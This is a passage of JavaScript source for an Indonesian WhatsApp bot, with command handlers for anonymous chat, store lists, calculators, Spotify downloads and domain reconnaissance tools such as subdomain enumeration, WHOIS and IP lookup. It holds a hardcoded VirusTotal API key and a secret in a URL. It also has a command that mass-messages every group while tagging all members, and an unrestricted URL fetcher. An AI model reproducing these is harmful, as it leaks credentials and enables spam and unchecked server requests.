let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
m.reply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
throw false
}
let other = romeo.other(m.sender)
if (other) await vreden.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
vreden.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
m.reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
m.reply(`Mohon Tunggu Sedang Mencari Partner`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
}
case 'sendprofile': case 'sendprofil':
if (m.isGroup) return warning('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romoe = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romoe) {
m.reply(`⚠️ Kamu belum pernah memulai chat!\n\n${prefix}start -- _Mencari partner_`)
//var teks = `⚠️ Kamu belum pernah memulai chat!`
//await vreden.sendMessage(m.chat, { text: teks, footer: footxt, templateButtons: but })
throw false
} else {
let rms = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state == "CHATTING")
var partnerJID = rms.other(m.sender)
var res = await vreden.sendContact(partnerJID, [m.sender.split("@")[0]])
vreden.sendMessage(m.chat, { text: '✅ Berhasil mengirim profil ke teman chat anda!' }, { quoted: m })
vreden.sendMessage(partnerJID, { text: '👨👩 Teman chat kamu memberikan kontak profil nya!' }, { quoted: res })
}
db.data.users[m.sender].exp += await randomNomor(20)
break
//━━━━━━━━━━━━━━━[ STORE ]━━━━━━━━━━━━━━━━━//
case 'jpm':{
if (!isCreator) return tolakk(mess.OnlyOwner)
if (!text) return m.reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
m.reply('*Prosess mas...*')
let getGroups = await vreden.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await vreden.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await vreden.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
await vreden.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await vreden.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
m.reply("*Done JPM ✅*")
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'list': case 'store':{
if (db_respon_list.length === 0) return warning(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return warning(`Belum ada list message yang terdaftar di group ini`)
let teks = `Halo @${m.sender.split("@")[0]} berikut beberapa list yang tersedia saat ini.\n\n`
for (let i of db_respon_list) {
if (i.id === m.chat) {
teks += `- ${i.key.toUpperCase()}\n`
}
}
teks += `\n\nUntuk melihat detail produk, silahkan kirim nama produk yang ada pada list di atas. Misalnya kamu ingin melihat detail produk dari ${db_respon_list[0].key.toUpperCase()}, maka kirim pesan ${db_respon_list[0].key.toUpperCase()} kepada bot`
vreden.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted:m}) 
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'dellist':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (db_respon_list.length === 0) return warning(`Belum ada list message di database`)
if (!text) return warning(`Gunakan dengan cara ${prefix + command} *key*\n\n_Contoh_\n\n${prefix + command} hello`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return warning(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
m.reply(`Sukses delete list message dengan key *${q}*`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'addlist':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return warning(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return warning(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
let media = await vreden.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
addResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
m.reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
m.reply(`Sukses set list message dengan key : *${args1}*`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'updatelist': case 'update':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return warning(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return warning(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
let media = await vreden.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
updateResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
m.reply(`Sukses update respon list dengan key *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
m.reply(`Sukses update respon list dengan key *${args1}*`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'tambah':{
if (!text.includes('+')) return warning(`Gunakan dengan cara ${prefix+command} *angka* + *angka*\n\n_Contoh_\n\n${prefix+command} 1+2`)
arg = args.join(' ')
atas = arg.split('+')[0]
bawah = arg.split('+')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
m.reply(`${nilai_one + nilai_two}`)}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'kurang':{
if (!text.includes('-')) return warning(`Gunakan dengan cara ${prefix+command} *angka* - *angka*\n\n_Contoh_\n\n${prefix+command} 1-2`)
arg = args.join(' ')
atas = arg.split('-')[0]
bawah = arg.split('-')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
m.reply(`${nilai_one - nilai_two}`)}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'kali':{
if (!text.includes('*')) return warning(`Gunakan dengan cara ${prefix+command} *angka* * *angka*\n\n_Contoh_\n\n${prefix+command} 1*2`)
arg = args.join(' ')
atas = arg.split('*')[0]
bawah = arg.split('*')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
m.reply(`${nilai_one * nilai_two}`)}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'bagi':{
if (!text.includes('/')) return warning(`Gunakan dengan cara ${prefix+command} *angka* / *angka*\n\n_Contoh_\n\n${prefix+command} 1/2`)
arg = args.join(' ')
atas = arg.split('/')[0]
bawah = arg.split('/')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
m.reply(`${nilai_one / nilai_two}`)}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'setproses': case 'setp':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!text) return warning(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) return warning(`Set proses already active`)
addSetProses(text, m.chat, set_proses)
m.reply(`✅ Done set proses!`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'changeproses': case 'changep':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!text) return warning(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) {
changeSetProses(text, m.chat, set_proses)
m.reply(`Sukses ubah set proses!`)
} else {
addSetProses(text, m.chat, set_proses)
m.reply(`Sukses ubah set proses!`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delsetproses': case 'delsetp':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isSetProses(m.chat, set_proses)) return warning(`Belum ada set proses di gc ini`)
removeSetProses(m.chat, set_proses)
m.reply(`Sukses delete set proses`)
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'setdone':{
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!text) return warning(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetDone(m.chat, set_done)) return warning(`Udh set done sebelumnya`)
addSetDone(text, m.chat, set_done)
m.reply(`Sukses set done!`)
db.data.users[m.sender].exp += await randomNomor(20)
break
}
case 'changedone': case 'changed':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!text) return warning(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetDone(m.chat, set_done)) {
changeSetDone(text, m.chat, set_done)
m.reply(`Sukses ubah set done!`)
} else {
addSetDone(text, m.chat, set_done)
m.reply(`Sukses ubah set done!`)
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'delsetdone': case 'delsetd':
if (!m.isGroup) return warning(mess.OnlyGrup)
if (!isAdmins && !isCreator) return tolakk(mess.GrupAdmin)
if (!isSetDone(m.chat, set_done)) return warning(`Belum ada set done di gc ini`)
removeSetDone(m.chat, set_done)
m.reply(`Sukses delete set done`)
db.data.users[m.sender].exp += await randomNomor(20)
break
//▢━━━━━━━━━━━━━━「 TOOLS COMMAND 」━━━━━━━━━━━━━━▢
case 'gempa': case 'infogempa':{
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let gempe = await gempa()
vreden.sendMessage(m.chat, { image: { url: gempe.data.imagemap }, caption: `*乂 INFO - GEMPA*\n\nWaktu : ${gempe.data.waktu}\nMagnitude : ${gempe.data.magnitude}\nKedalaman : ${gempe.data.kedalaman}\nKoordinat : ${gempe.data.lintang_bujur}\nLokasi : ${gempe.data.wilayah}\nDirasakan : ${gempe.data.dirasakan}\n\nData Berdasarkan: https://www.bmkg.go.id/gempabumi/gempabumi-terkini.bmkg`}, {quoted: m})
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'get': {
if (!/^https?:\/\//.test(text)) return warning('*Masukan URL nya!*\n\nContoh:\n.get https://api.vreden.my.id/api/ytmp3?url=https://youtube.com/watch?v=YBnxAP6qst4');
const ajg = await fetch(text);
if (ajg.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
throw `Content-Length: ${ajg.headers.get('content-length')}`;
}
const contentType = ajg.headers.get('content-type');
if (contentType.startsWith('image/')) {
return vreden.sendMessage(m.chat, { image: { url: text } }, 'imageMessage', text, m);
}
if (contentType.startsWith('video/')) {
return vreden.sendMessage(m.chat, { video: { url: text } }, 'videoMessage', text, m);
}
if (contentType.startsWith('audio/')) {
return vreden.sendMessage(m.chat, { audio: { url: text } }, 'audioMessage', text, m);
}
let alak = await ajg.buffer();
try {
alak = util.format(JSON.parse(alak + ''));
} catch (e) {
alak = alak + '';
} finally {
balas(alak.slice(0, 65536));
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'apikey': {
if (!isCreator) return tolakk('Khusus Owner Bot')
if (!q) return warning(`Contoh: ${prefix+command} 62xxxx`)
if (!m.quoted && !m.mentionedJid[0] && isNaN(parseInt(args[0]))) return warning('Tag/reply pesan target yang ingin di kick!')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
try {
let api = await fetchJson(`https://skizo.tech/api/checkapikey?phone=${users}&secret=bejo112`)
let respon = `乂 SETTING APIKEY

*Apikey:* ${api.apikey}
*Number:* ${api.phone}
*Secret:* ${api.secret}
*Banned:* ${api.banned ? 'Terbanned' : "Tidak"}
*Role:* ${api.role}
*Limit:* ${api.limit}
*Limit Premium:* ${api.limitpremium}
*Akses:* ${api.access}
*Hit Total:* ${api.consume_limit}
*Hit Today:* ${api.consume_limit_today}
*Akses Today:* ${api.access_today}
*Digunakan:* ${api.last_date_access}
*Register:* ${api.formatted.registered_at}
*Expired:* ${api.formatted.expired}
*Time Used:* ${api.formatted.last_access}
*IP Access:*
`
for (let ress of api.ip_access) {
respon += `\n- *IP Access:* ${ress.ip_address}
- *Limit:* ${ress.access}
- *Digunakan:* ${ress.formatted.last_access}
────────────────────
`
}
balas(respon)
} catch (e) {
console.log(e)
m.reply('Apikey Tidak Ditemukan')
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'whois': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!db.data.users[m.sender].daftar) return warning(`Daftar terlebih dahulu\nguna mengakses fitur ini`)
if (!q) return warning(`Contoh: ${prefix+command} link`)
if (budy.match(`/|https|http|:`)) return warning(`Masukan domain saja\n\n*Contoh:*\n\n.whois google.com`)
async function whois(url) {
  try {
    const { data: html } = await axios.get('https://who.is/whois/'+url);
    const $ = cheerio.load(html);

    const data = $('.queryResponseBodyRow').map((_, element) => {
      const domain = $(element).find('.col-md-8.queryResponseBodyValue a').text();
      const ip = $(element).find('.col-md-4.queryResponseBodyValue a').text();
      return domain && ip ? { domain, ip } : null;
    }).get();

    const whoisInfo = $('pre').text().trim();

    const expiresOn = $("div:contains('Expires On')").next('.queryResponseBodyValue').text().trim() || null;
    const registeredOn = $("div:contains('Registered On')").next('.queryResponseBodyValue').text().trim() || null;
    const updatedOn = $("div:contains('Updated On')").next('.queryResponseBodyValue').text().trim() || null;

    return { domains: data, whoisInfo, expiresOn, registeredOn, updatedOn };
  } catch (error) {
    console.error('Error fetching data:', error);
    return null;
  }
}
try {
let whos = await whois(text)
let teks = '*乂 WHOIS DOMAIN*\n\n*Nameserver:*\n'
for (let hasil of whos.domains) {
teks += `NS: ${hasil.domain}
IP: ${hasil.ip}

`
}
teks += `
────────────────────

*Info Whois:* ${whos.whoisInfo ? whos.whoisInfo : "tadak"}
*Registered:* ${whos.registeredOn ? whos.registeredOn : "-"}
*Updated:* ${whos.updatedOn ? whos.updatedOn : "-"}
*Expired:* ${whos.expiresOn ? whos.expiresOn : "-"}

`
balas(teks)
} catch {
m.reply(mess.error.Iv)
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ipwhois': case 'cekip': case 'whoisip': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!db.data.users[m.sender].daftar) return warning(`Daftar terlebih dahulu\nguna mengakses fitur ini`)
if (!q) return warning(`Contoh: ${prefix+command} 144.0.283.11`)
try {
let res = await fetchJson(`https://ipwho.is/${text}?lang=id-ID`)
const ip = res.ip
const type = res.type
const benua = res.continent
const country = res.country
const countrycode = res.country_code
const wilayah = res.region
const city = res.city
const notlp = res.calling_code
const ibukota = res.capital
const perbatasan = res.borders
const emoji = res.flag.emoji
const latitude = res.latitude
const longitude = res.longitude
const org = res.connection.org
const isp = res.connection.isp
const dom = res.connection.domain
vreden.sendMessage(m.chat, { location: { degreesLatitude: latitude, degreesLongitude: longitude, name: `IP From ${country} ${emoji}`, address: `${res.city}, ${res.region}, ${res.country}` } })
await sleep(1000)
balas(`• *IP* : ${ip}
• *Type IP* : ${res.type}
• *Benua* : ${res.continent}
• *Negara* : ${res.country} (${res.country_code})
• *Ibukota Negara* : ${res.capital}
• *Wilayah IP* : ${res.region}
• *Kota* : ${res.city}
• *Kode telpon* : +${res.calling_code}
• *Perbatasan* : ${res.borders}
• *Pemilik IP* : ${res.connection.org}
• *Provider* : ${res.connection.isp}
• *Domain* : ${dom}

> ${footxt}`)
} catch (e) {
m.reply('IP Tidak Ditemukan, Masukan IP Yang Benar!')
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'cekhp': case 'device': {
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} iPhone 13`)
if (!db.data.users[m.sender].daftar) return warning(`Daftar terlebih dahulu\nguna mengakses fitur ini`)
try {
let data = await gsmarena.search.search(text)
let teks = '*乂 DEVICE SEACRH*\n\n'
for (let hasil of data) {
teks += `*Name:* ${hasil.name}\n*Deskripsi:* ${hasil.description}\n\n─────────────────\n\n`
}
if (data.length < 3) { vreden.sendMessage(m.chat, { image: { url: data[0].img },  caption: teks }, { quoted: m }) }
if (data.length > 2) {
let button = [
              {
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"${data[0].name}\",\"id\":\".hpdetail ${data[0].id}\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"${data[1].name}\",\"id\":\".hpdetail ${data[1].id}\"}`
              },{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"${data[2].name}\",\"id\":\".hpdetail ${data[2].id}\"}`
              }
           ]
sendButtonBiasa(m.chat, botName, teks, button)
}
} catch (e) {
m.reply('Terjadi kesalahan dalam sistem')
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'hpdetail': case 'devicedetail': {
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} apple_iphone_13_pro_max-11089`)
if (!db.data.users[m.sender].daftar) return warning(`Daftar terlebih dahulu\nguna mengakses fitur ini`)
try {
let data = await gsmarena.catalog.getDevice(text)
let teks = `*乂 DEVICE DETAIL*\n\n*Name:* ${data.name}\n`
for (let hasil of data.detailSpec) {
teks += `\n*${pj}${hasil.category}:${pj}*\n`
for (let sila of hasil.specifications) {
teks += `*${sila.name}:* ${sila.value}\n`
}
}
for (let sil of data.quickSpec) {
teks += `*${pj}${sil.name}:${pj}* ${sil.value}\n`
}
await vreden.sendMessage(m.chat, { image: { url: data.img },  caption: teks }, { quoted: m })
} catch (e) {
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'cekhost': case 'checkhost': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!db.data.users[m.sender].daftar) return warning(`Daftar terlebih dahulu\nguna mengakses fitur ini`)
if (!text) return warning(`*Masukan Domain Web!*\n\nContoh :\n${prefix + command} google.com`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
let host = await axios.post(
  'https://check-host.cc/rest/V2/http',
  {
    'target': text,
    'apikey': 'NOKEY',
    'ClientIP': null
  },
  {
    headers: {
      'accept': 'application/json',
      'Content-Type': 'application/json'
    }
  }
);
let idport = host.data.reportid
await sleep(5000)
let hostreport = await fetchJson(`https://check-host.cc/rest/V2/report/${idport}`)
let teks = `*乂 CEK HOST WEB*\n\nID: ${idport}\n\n`;
for (let x of hostreport.slaves) {
teks += `- Server: ${x.server}
- Status: ${x.code}
- Ping: ${x.time ? x.time : "down"}\n────────────────────\n\n`
}
let tekss = teks.replace(/<span style="color: #ea5455;">/g, '').replace(/span>/g, '').replace(/[</]/g, '')
balas(tekss)
} catch (e) {
m.reply('Domain Invalid...')
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'subdo': case 'subdomain': case 'ceksubdo': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!db.data.users[m.sender].daftar) return warning(`Daftar terlebih dahulu\nguna mengakses fitur ini`)
if (!text) return warning(`*Masukan Domain Web!*\n\nContoh :\n${prefix + command} google.com`)
if (budy.match(`/|https|http|:`)) return warning(`*Masukan Domain Saja!*\n\nContoh:\n.urlscan google.com`)
try {
let domoi = await axios.get(`https://crt.sh/?q=${text}&output=json`, {
            headers: {
                'Content-Type': 'application/json'
            }
        });
let dommi = await domoi.data
let teks = `*乂 SUBDOMAIN CEK*\n\n`
let t = []
for (let n of dommi) {
n.name_value.split("\n").map((v) => t.push(v));
}
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
for (let x of [...new Set(t.filter((v) => !v.startsWith("*")))]) {
teks += `*Subdo:* ${x}\n*DNS:* \n`
let dnns = await dns.promises.resolve4(x).catch(async () => "-" )
var suom
suom = dnns ? dnns.length : 0
for (let i = 0; i < suom; i++) {
teks += `- ${dnns[i] ? dnns[i] : "-"}\n`
}
teks += `\n────────────────────\n\n`
}
balas(teks)
} catch {
console.log(e)
m.reply('Domain Invalid...')
}
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'ngl': case 'sendngl': {
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} https://ngl.link/denakhtar1 hallo`)
if (!budy.match('https://ngl.link/')) return warning(`Contoh:\n${prefix + command} https://ngl.link/denakhtar1 hallo`)
let [usersi, ...message] = text.split(' ');
let userr = usersi.split('https://ngl.link/')[1]
message = message.join(' ');
let ngl = await axios.post("https://ngl.link/api/submit",
    `username=${userr}&question=${message}&deviceId=18d7b980-ac6a-4878-906e-087dfec6ea1b&gameSlug=&referrer=`
  );
balas(`*Pesan terkirim 🤓*

ID: ${ngl.data.questionId}
Region: ${ngl.data.userRegion}
`)
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'dns': case 'cekdns': case 'dnsrecord': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!db.data.users[m.sender].daftar) return warning(`Daftar terlebih dahulu\nguna mengakses fitur ini`)
if (!text) return warning(`*Masukan Domain Web!*\n\nContoh :\n${prefix + command} google.com`)
if (budy.match(`/|https|http|:`)) return warning(`*Masukan Domain Saja!*\n\nContoh:\n.urlscan google.com`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
try {
const options = {
  method: 'GET',
  headers: {
    accept: 'application/json',
    'x-apikey': 'd8d56420a997b7372501df999e2fa9b6226c5864ccf509bf142c9f618fdca90c'
  }
};
let domain = await fetchJson(`https://www.virustotal.com/api/v3/domains/${text}/subdomains?limit=100`, options)
let teks = `*乂 DOMAIN DNS CEK*\n\n`;
for (let x of domain.data) {
teks += `*Sub:* ${x.id}
*Type:* ${x.type}
*DNS Record:*\n\n`
for (let p of x.attributes.last_dns_records) {
teks += `- *Type:* ${p.type}
- *TTL:* ${p.ttl}
- *Value:* ${p.value}\n\n`;
}
teks += `\n────────────────────\n\n`
}
balas(teks)
} catch {
console.log(e)
m.reply('Domain Invalid...')
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
}
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'urlscan': case 'scanurl': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!db.data.users[m.sender].daftar) return warning(`Daftar terlebih dahulu\nguna mengakses fitur ini`)
if (!text) return warning(`*Masukan Domain Web!*\n\nContoh :\n${prefix + command} google.com`)
if (budy.match(`/|https|http|:`)) return warning(`*Masukan Domain Saja!*\n\nContoh:\n.urlscan google.com`)
await vreden.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
let anu = await axios.get(`https://urlscan.io/api/v1/search/?q=${text}`)
if (anu.data.total <= 1) return warning('Masukan link yang valid/aktif')
let teks = `乂 DOMAIN CHECKER\n\n`;
for (let x of anu.data.results) {
teks += `*visibility:* ${x.task.visibility}
*method:* ${x.task.method}
*country:* ${x.page.country}
*ip:* ${x.page.ip}
*url:* ${x.page.url}
*sub domain:* ${x.page.ptr}\n\n────────────────────\n\n`;
}
balas(teks)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
//━━━━━━━━━━━━━━━[ DOWNLOADER ]━━━━━━━━━━━━━━━━━//
case 'spotifys': case 'spotifysearch': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`*Masukan Input Query!*\n\nContoh:\n${prefix + command} DJ melodi kane`)
if (budy.match(`colmek|coli|desah|ah ah|bokep|tobrut|seksi|sex|sexi|memek|kontol|titit`)) return tolakk('Terdeteksi Kata Aneh, Tidak Dapat Dilanjutkan')
let anu = await searchSpotifyTracks(text);
let teks = `乂 SPOTIFY - MUSIC\n\n`;
for (let x of anu) {
teks += `• *Title* : ${x.name}\n`;
teks += `• *Artis* : ${x.artists.map(v => v.name).join(', ')}\n`;
teks += `• *Link* : ${x.external_urls.spotify}\n\n────────────────────\n\n`;
}
balas(teks)
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'playsp': case 'spotifyplay': case 'playspotify': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`*Masukan Judul Lagu!*\n\nContoh :\n${prefix + command} DJ melodi kane`)
        let anu = await searchSpotifyTracks(text)
        let anuu = anu[0]
        const spotify = await fetchJson(`https://api.vreden.my.id/api/spotify?url=${anuu.external_urls.spotify}`)
        const details = `- *Title:* ${spotify.result.title}\n- *Artists:* ${spotify.result.artis}\n- *Type:* ${spotify.result.type}\n- *Durasi:* ${clockString(spotify.result.durasi)}`
await vreden.relayMessage(m.chat, {
extendedTextMessage:{
text: details, 
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {
title: "乂 SPOTIFY - MUSIC",
mediaType: 1,
previewType: 0,
renderLargerThumbnail: true,
thumbnailUrl: spotify.result.image,
sourceUrl: anuu.external_urls.spotify
}
}, mentions: [m.sender]
}}, {})
await vreden.sendMessage(m.chat, {audio: { url: spotify.result.download }, mimetype: 'audio/mpeg' },{ quoted: m })
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'spotifydl': case 'spotify': {
if (db.data.users[m.sender].limit < 1) return warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
if (!text) return warning(`*Masukan Link Lagu!*\n\nContoh :\n${prefix + command} https://open.spotify.com/track/1CLsaJJLi4c70riGE9Nveb`)
const spotify = await fetchJson(`https://api.vreden.my.id/api/spotify?url=${text}`)
        const details = `- *Title:* ${spotify.result.title}\n- *Artists:* ${spotify.result.artis}\n- *Type:* ${spotify.result.type}\n- *Durasi:* ${clockString(spotify.result.durasi)}`
await vreden.relayMessage(m.chat, {
extendedTextMessage:{
text: details, 
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
externalAdReply: {
title: "乂 SPOTIFY - MUSIC",
mediaType: 1,
previewType: 0,
renderLargerThumbnail: true,
thumbnailUrl: spotify.result.image,
sourceUrl: text
}
}, mentions: [m.sender]
}}, {})
await vreden.sendMessage(m.chat, {audio: { url: spotify.result.download }, mimetype: 'audio/mpeg' },{ quoted: m })
}
if (!isCreator && !isPremium) { db.data.users[m.sender].limit -= 1 }
db.data.users[m.sender].exp += await randomNomor(20)
break
case 'yt': case 'play': case 'ytplay':{
